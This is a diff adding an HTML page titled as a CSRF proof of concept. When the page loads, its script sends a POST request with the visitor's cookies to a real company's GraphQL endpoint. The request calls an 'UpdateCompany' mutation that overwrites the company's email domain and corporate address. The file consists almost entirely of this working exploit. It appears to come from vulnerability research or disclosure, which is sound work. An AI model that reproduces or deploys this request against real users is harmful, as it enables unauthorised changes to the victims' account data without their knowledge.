@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF PoC</title>
+</head>
+<body>
+    <h1>CSRF Proof of Concept</h1>
+    <script>
+        // Define the malicious payload
+        const data = {
+            "operationName": "UpdateCompany",
+            "variables": {
+                "input": {
+                    "emailDomain": "suga.com",
+                    "corporateAddress": {
+                        "addressLine1": "SUGA-INC-STREET-000",
+                        "addressLine2": "Suga inc street 2",
+                        "state": "AA",
+                        "city": "SUGA suga TEST-CITY",
+                        "zipCode": "10005"
+                    }
+                }
+            },
+            "query": "mutation UpdateCompany($input: UpdateCompanyInput) {\n  updateCompany(input: $input) {\n    errors {\n      message\n      uid\n    }\n  }\n}\n"
+        };
+
+        // Send the CSRF request using fetch API
+        fetch('https://tdm.dell.com/graphql', {
+            method: 'POST',
+            credentials: 'include', // Include cookies in the request
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        }).then(response => {
+            return response.text();
+        }).then(data => {
+            console.log(data); // Log the response for demonstration purposes
+        }).catch((error) => {
+            console.error('Error:', error);
+        });
+    </script>
+</body>
+</html>
